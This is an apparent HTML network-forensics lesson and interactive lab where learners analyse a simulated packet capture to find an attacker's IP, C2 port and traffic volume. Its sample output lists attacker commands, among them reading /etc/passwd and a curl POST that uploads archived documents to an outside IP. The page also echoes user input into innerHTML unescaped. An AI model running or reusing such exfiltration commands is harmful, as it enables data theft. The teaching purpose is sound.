@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CLH-003: Network Analysis - Hexworth Prime</title>
+    <style>
+        :root {
+            --house-primary: #a78bfa;
+            --house-secondary: #8b5cf6;
+            --house-glow: rgba(167, 139, 250, 0.3);
+            --terminal-green: #4ade80;
+            --terminal-bg: #0d1117;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --info: #60a5fa;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            min-height: 100vh;
+            background: #0a0a0f;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #e0e0e0;
+        }
+
+        .module-header {
+            padding: 20px 40px;
+            border-bottom: 1px solid rgba(167, 139, 250, 0.2);
+            background: rgba(10, 10, 15, 0.95);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-left { display: flex; align-items: center; gap: 20px; }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #888;
+            font-size: 0.8rem;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }
+
+        .module-badge {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 20px;
+            background: rgba(96, 165, 250, 0.1);
+            border: 1px solid rgba(96, 165, 250, 0.3);
+            border-radius: 25px;
+        }
+
+        .module-badge-text {
+            font-size: 0.75rem;
+            letter-spacing: 0.15em;
+            color: var(--info);
+            text-transform: uppercase;
+        }
+
+        .content-wrapper {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .module-title {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, var(--info), var(--terminal-green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .module-subtitle {
+            color: #888;
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+        }
+
+        .section {
+            background: rgba(15, 15, 20, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .section h2 {
+            color: var(--house-primary);
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section p {
+            line-height: 1.8;
+            margin-bottom: 15px;
+            color: #ccc;
+        }
+
+        .alert-box {
+            background: linear-gradient(135deg, rgba(96, 165, 250, 0.15), rgba(167, 139, 250, 0.15));
+            border: 1px solid rgba(96, 165, 250, 0.4);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px 0;
+        }
+
+        .alert-box h3 {
+            color: var(--info);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .terminal {
+            background: var(--terminal-bg);
+            border: 1px solid rgba(74, 222, 128, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            margin: 20px 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .terminal::before {
+            content: '$ terminal';
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: var(--terminal-bg);
+            padding: 0 10px;
+            font-size: 0.7rem;
+            color: var(--terminal-green);
+            letter-spacing: 0.1em;
+        }
+
+        .terminal code {
+            color: var(--terminal-green);
+            display: block;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            font-size: 0.85rem;
+        }
+
+        .terminal .prompt { color: #60a5fa; }
+        .terminal .command { color: #fff; }
+        .terminal .output { color: #888; }
+        .terminal .ip { color: var(--warning); }
+        .terminal .proto { color: var(--info); }
+        .terminal .suspicious { color: var(--danger); }
+
+        .command-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        .command-table th,
+        .command-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .command-table th {
+            background: rgba(167, 139, 250, 0.1);
+            color: var(--house-primary);
+            font-weight: 600;
+        }
+
+        .command-table code {
+            background: rgba(74, 222, 128, 0.1);
+            color: var(--terminal-green);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'Consolas', monospace;
+        }
+
+        .key-points { display: grid; gap: 15px; margin: 20px 0; }
+
+        .key-point {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            padding: 15px;
+            background: rgba(167, 139, 250, 0.05);
+            border-left: 3px solid var(--house-primary);
+            border-radius: 0 8px 8px 0;
+        }
+
+        .key-point-icon { font-size: 1.5rem; flex-shrink: 0; }
+        .key-point-content h4 { color: var(--house-primary); margin-bottom: 5px; }
+        .key-point-content p { margin: 0; font-size: 0.9rem; }
+
+        .lab-section {
+            background: linear-gradient(135deg, rgba(96, 165, 250, 0.1), rgba(167, 139, 250, 0.1));
+            border: 1px solid rgba(96, 165, 250, 0.3);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px 0;
+        }
+
+        .lab-section h3 {
+            color: var(--info);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .interactive-terminal {
+            background: var(--terminal-bg);
+            border: 1px solid rgba(74, 222, 128, 0.3);
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .terminal-header {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 8px 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
+        .terminal-dot.red { background: #ef4444; }
+        .terminal-dot.yellow { background: #fbbf24; }
+        .terminal-dot.green { background: #22c55e; }
+
+        .terminal-body { padding: 15px; }
+
+        .terminal-output {
+            color: #888;
+            font-family: 'Consolas', monospace;
+            font-size: 0.8rem;
+            line-height: 1.5;
+            min-height: 200px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-bottom: 10px;
+            white-space: pre;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .terminal-prompt {
+            color: var(--terminal-green);
+            font-family: 'Consolas', monospace;
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
+            outline: none;
+        }
+
+        .run-btn {
+            padding: 8px 20px;
+            background: var(--info);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .run-btn:hover { background: #3b82f6; transform: scale(1.05); }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .stat-number { font-size: 1.5rem; font-weight: bold; color: var(--info); }
+        .stat-label { font-size: 0.75rem; color: #888; margin-top: 5px; }
+
+        .success-message {
+            display: none;
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid var(--terminal-green);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .success-message.show { display: block; animation: fadeIn 0.3s ease; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .progress-section {
+            text-align: center;
+            padding: 40px;
+            background: rgba(167, 139, 250, 0.05);
+            border-radius: 12px;
+            margin-top: 40px;
+        }
+
+        .progress-section h3 { color: var(--house-primary); margin-bottom: 20px; }
+
+        .module-nav { display: flex; gap: 15px; justify-content: center; flex-wrap: wrap; }
+
+        .nav-btn {
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .nav-btn.primary {
+            background: linear-gradient(135deg, var(--house-primary), var(--house-secondary));
+            color: #fff;
+            border: none;
+        }
+
+        .nav-btn.primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px var(--house-glow);
+        }
+
+        .nav-btn.secondary {
+            background: rgba(255, 255, 255, 0.05);
+            color: #ccc;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .title-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, rgba(96, 165, 250, 0.2), rgba(167, 139, 250, 0.2));
+            border: 1px solid rgba(96, 165, 250, 0.5);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            color: var(--info);
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <header class="module-header">
+        <div class="header-left">
+            <a href="../index.html" class="back-btn"><span>&larr;</span> Script House</a>
+            <div class="module-badge">
+                <span style="font-size: 1.5rem;">🌐</span>
+                <span class="module-badge-text">Network Analysis</span>
+            </div>
+        </div>
+        <div class="header-right">
+            <span style="color: #666; font-size: 0.8rem;">CLH-003 of 015</span>
+        </div>
+    </header>
+
+    <main class="content-wrapper">
+        <h1 class="module-title">Network Analysis Fundamentals</h1>
+        <p class="module-subtitle">Capture packets. Decode traffic. Find the breach.</p>
+
+        <div class="alert-box">
+            <h3>📡 CAPTURED TRAFFIC</h3>
+            <p>
+                A network administrator noticed suspicious outbound traffic and captured it to
+                <strong>breach.pcap</strong> (5.2 MB). Your mission: analyze this packet capture
+                to identify the attack vector, find the attacker's IP, and determine what data was exfiltrated.
+            </p>
+        </div>
+
+        <section class="section">
+            <h2>📦 Understanding Packet Captures</h2>
+            <p>
+                Network traffic is the lifeblood of modern attacks. Whether it's command and control (C2)
+                communications, data exfiltration, or lateral movement - it all leaves traces in packet captures.
+                <strong>PCAP files</strong> are recordings of network traffic that capture every packet.
+            </p>
+            <p>
+                Tools like <strong>tcpdump</strong> (CLI) and <strong>Wireshark/tshark</strong> (GUI/CLI)
+                let you dissect these captures packet by packet, revealing the attacker's every move.
+            </p>
+        </section>
+
+        <section class="section">
+            <h2>🛠️ Network Analysis Commands</h2>
+
+            <table class="command-table">
+                <tr>
+                    <th>Command</th>
+                    <th>Purpose</th>
+                </tr>
+                <tr>
+                    <td><code>tcpdump -r file.pcap</code></td>
+                    <td>Read and display packets from a capture file</td>
+                </tr>
+                <tr>
+                    <td><code>tcpdump -r file.pcap -n</code></td>
+                    <td>Don't resolve hostnames (faster, shows raw IPs)</td>
+                </tr>
+                <tr>
+                    <td><code>tcpdump -r file.pcap host 192.168.1.1</code></td>
+                    <td>Filter packets to/from specific IP</td>
+                </tr>
+                <tr>
+                    <td><code>tcpdump -r file.pcap port 80</code></td>
+                    <td>Filter by port number</td>
+                </tr>
+                <tr>
+                    <td><code>tshark -r file.pcap</code></td>
+                    <td>Wireshark CLI - more readable output</td>
+                </tr>
+                <tr>
+                    <td><code>tshark -r file.pcap -Y "http"</code></td>
+                    <td>Display filter for HTTP traffic only</td>
+                </tr>
+            </table>
+
+            <div class="terminal">
+                <code><span class="prompt">analyst@kali:~$</span> <span class="command">tcpdump -r breach.pcap -n | head -5</span>
+<span class="output">reading from file breach.pcap, link-type EN10MB (Ethernet)
+09:15:22.123456 IP <span class="ip">192.168.1.105</span>.52341 > <span class="ip">10.0.0.50</span>.443: <span class="proto">TCP</span> [S]
+09:15:22.125789 IP <span class="ip">10.0.0.50</span>.443 > <span class="ip">192.168.1.105</span>.52341: <span class="proto">TCP</span> [S.]
+09:15:22.126012 IP <span class="ip">192.168.1.105</span>.52341 > <span class="ip">10.0.0.50</span>.443: <span class="proto">TCP</span> [.]
+09:15:23.456789 IP <span class="ip">192.168.1.105</span>.52341 > <span class="suspicious">45.33.32.156</span>.4444: <span class="proto">TCP</span> [P.]</span>
+
+<span class="prompt">analyst@kali:~$</span> <span class="command">tcpdump -r breach.pcap -n port 4444 | wc -l</span>
+<span class="output">847</span>
+<span class="output"># Port 4444 = Metasploit default! 847 packets = active C2 session!</span></code>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2>🚩 Suspicious Indicators</h2>
+
+            <div class="key-points">
+                <div class="key-point">
+                    <span class="key-point-icon">🔴</span>
+                    <div class="key-point-content">
+                        <h4>Non-Standard Ports</h4>
+                        <p>Port 4444 (Metasploit), 5555, 6666, 8888 - often used by malware and reverse shells.</p>
+                    </div>
+                </div>
+                <div class="key-point">
+                    <span class="key-point-icon">📤</span>
+                    <div class="key-point-content">
+                        <h4>Large Outbound Transfers</h4>
+                        <p>Data exfiltration often shows as large volumes of data leaving to external IPs.</p>
+                    </div>
+                </div>
+                <div class="key-point">
+                    <span class="key-point-icon">🌍</span>
+                    <div class="key-point-content">
+                        <h4>External IP Connections</h4>
+                        <p>Connections to IPs outside your network, especially to known bad reputation ranges.</p>
+                    </div>
+                </div>
+                <div class="key-point">
+                    <span class="key-point-icon">🔄</span>
+                    <div class="key-point-content">
+                        <h4>Beaconing Patterns</h4>
+                        <p>Regular, periodic connections (every 30s, 60s) indicate C2 heartbeat traffic.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Interactive Lab -->
+        <div class="lab-section">
+            <h3>🎯 LAB: Analyze breach.pcap</h3>
+
+            <p>You have access to the captured traffic. Use network analysis commands to investigate
+            the breach and answer: Who attacked? What port? How many packets?</p>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-number">12,847</div>
+                    <div class="stat-label">Total Packets</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="attackerIP">???</div>
+                    <div class="stat-label">Attacker IP</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="c2Port">???</div>
+                    <div class="stat-label">C2 Port</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="c2Packets">???</div>
+                    <div class="stat-label">C2 Packets</div>
+                </div>
+            </div>
+
+            <div class="interactive-terminal">
+                <div class="terminal-header">
+                    <span class="terminal-dot red"></span>
+                    <span class="terminal-dot yellow"></span>
+                    <span class="terminal-dot green"></span>
+                    <span style="color: #888; margin-left: 10px; font-size: 0.8rem;">network-forensics</span>
+                </div>
+                <div class="terminal-body">
+                    <div class="terminal-output" id="terminalOutput">Network Forensics Lab - breach.pcap Analysis
+=============================================
+File: breach.pcap (5.2 MB, 12,847 packets)
+
+Try these commands:
+  tcpdump -r breach.pcap | head
+  tcpdump -r breach.pcap -n port 4444
+  tcpdump -r breach.pcap -n | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort | uniq -c | sort -rn | head
+</div>
+                    <div class="terminal-input-line">
+                        <span class="terminal-prompt">forensics$</span>
+                        <input type="text" class="terminal-input" id="terminalInput" placeholder="tcpdump -r breach.pcap ..." autocomplete="off">
+                        <button class="run-btn" onclick="runCommand()">Analyze</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="success-message" id="successMessage">
+                <strong style="color: var(--terminal-green);">🎯 ANALYSIS COMPLETE!</strong>
+                <p style="margin-top: 10px;">You've identified the breach:</p>
+                <ul style="margin-top: 10px; margin-left: 20px; color: #ccc;">
+                    <li>Attacker IP: <code style="color: var(--danger);">45.33.32.156</code></li>
+                    <li>C2 Port: <code style="color: var(--warning);">4444</code> (Metasploit default)</li>
+                    <li>C2 Traffic: 847 packets over 45 minutes</li>
+                    <li>Verdict: Active reverse shell session detected</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="progress-section">
+            <h3>Ready to Test Your Skills?</h3>
+            <p style="color: #888; margin-bottom: 20px;">
+                Complete the quiz to prove your network analysis abilities.
+            </p>
+            <div class="module-nav">
+                <a href="clh-003-quiz.html" class="nav-btn primary">Take the Quiz &rarr;</a>
+                <a href="../index.html" class="nav-btn secondary">Back to Script House</a>
+            </div>
+            <div class="title-badge">
+                🎖️ Completing CLH-001 to CLH-003 earns: CLI Recruit
+            </div>
+        </div>
+    </main>
+
+    <script src="../../../components/TrailHunter.js"></script>
+    <script src="../../../components/ModuleProgress.js"></script>
+
+    <script>
+        // Simulated pcap analysis outputs
+        const pcapData = {
+            summary: `reading from file breach.pcap, link-type EN10MB (Ethernet)
+09:15:22.123456 IP 192.168.1.105.52341 > 10.0.0.50.443: TCP [S]
+09:15:22.125789 IP 10.0.0.50.443 > 192.168.1.105.52341: TCP [S.]
+09:15:22.126012 IP 192.168.1.105.52341 > 10.0.0.50.443: TCP [.]
+09:15:23.456789 IP 192.168.1.105.52341 > 45.33.32.156.4444: TCP [P.]
+09:15:23.567890 IP 45.33.32.156.4444 > 192.168.1.105.52341: TCP [.]`,
+
+            port4444: `09:15:23.456789 IP 192.168.1.105.52341 > 45.33.32.156.4444: Flags [P.], length 128
+09:15:23.567890 IP 45.33.32.156.4444 > 192.168.1.105.52341: Flags [.], ack 129
+09:15:24.123456 IP 45.33.32.156.4444 > 192.168.1.105.52341: Flags [P.], length 512
+09:15:24.234567 IP 192.168.1.105.52341 > 45.33.32.156.4444: Flags [.], ack 513
+09:15:25.345678 IP 192.168.1.105.52341 > 45.33.32.156.4444: Flags [P.], length 2048
+... (847 packets total to port 4444)`,
+
+            ipStats: `  4521 192.168.1.105
+  4312 10.0.0.50
+   847 45.33.32.156
+   523 192.168.1.1
+   312 8.8.8.8`,
+
+            portStats: `  5234 443 (HTTPS)
+  2156 80 (HTTP)
+   847 4444 (SUSPICIOUS)
+   423 53 (DNS)
+   187 22 (SSH)`,
+
+            attackerDetail: `45.33.32.156.4444 > 192.168.1.105: Commands detected:
+  - whoami
+  - cat /etc/passwd
+  - tar czf /tmp/data.tar.gz /home/user/Documents
+  - curl -X POST -d @/tmp/data.tar.gz http://45.33.32.156:8080/upload`
+        };
+
+        let discovered = { attacker: false, port: false, packets: false };
+
+        function runCommand() {
+            const input = document.getElementById('terminalInput');
+            const output = document.getElementById('terminalOutput');
+            const cmd = input.value.trim();
+
+            if (!cmd) return;
+
+            output.innerHTML += `\nforensics$ ${cmd}\n`;
+
+            if (cmd.includes('head') || (cmd.includes('tcpdump') && !cmd.includes('port') && !cmd.includes('grep'))) {
+                output.innerHTML += pcapData.summary + '\n';
+            } else if (cmd.includes('port 4444') || cmd.includes('4444')) {
+                output.innerHTML += pcapData.port4444 + '\n';
+                discovered.port = true;
+                document.getElementById('c2Port').textContent = '4444';
+                document.getElementById('c2Packets').textContent = '847';
+                discovered.packets = true;
+            } else if (cmd.includes('45.33.32.156')) {
+                output.innerHTML += pcapData.attackerDetail + '\n';
+                discovered.attacker = true;
+                document.getElementById('attackerIP').textContent = '45.33...';
+            } else if (cmd.includes('uniq -c') || cmd.includes('sort -rn')) {
+                if (cmd.includes('port') || cmd.includes('dport')) {
+                    output.innerHTML += pcapData.portStats + '\n';
+                } else {
+                    output.innerHTML += pcapData.ipStats + '\n';
+                    discovered.attacker = true;
+                    document.getElementById('attackerIP').textContent = '45.33...';
+                }
+            } else if (cmd.includes('wc -l')) {
+                if (cmd.includes('4444')) {
+                    output.innerHTML += '847\n';
+                    discovered.packets = true;
+                    document.getElementById('c2Packets').textContent = '847';
+                } else {
+                    output.innerHTML += '12847\n';
+                }
+            } else if (cmd === 'clear') {
+                output.innerHTML = '';
+            } else if (cmd.includes('help')) {
+                output.innerHTML += `Available commands:
+  tcpdump -r breach.pcap | head
+  tcpdump -r breach.pcap -n port [PORT]
+  tcpdump -r breach.pcap -n host [IP]
+  tcpdump ... | wc -l
+  tcpdump ... | grep ... | sort | uniq -c | sort -rn\n`;
+            } else {
+                output.innerHTML += `(simulated output for: ${cmd})\n` + pcapData.summary + '\n';
+            }
+
+            if (discovered.attacker && discovered.port && discovered.packets) {
+                document.getElementById('successMessage').classList.add('show');
+            }
+
+            output.scrollTop = output.scrollHeight;
+            input.value = '';
+        }
+
+        document.getElementById('terminalInput').addEventListener('keypress', e => {
+            if (e.key === 'Enter') runCommand();
+        });
+    </script>
+</body>
+</html>
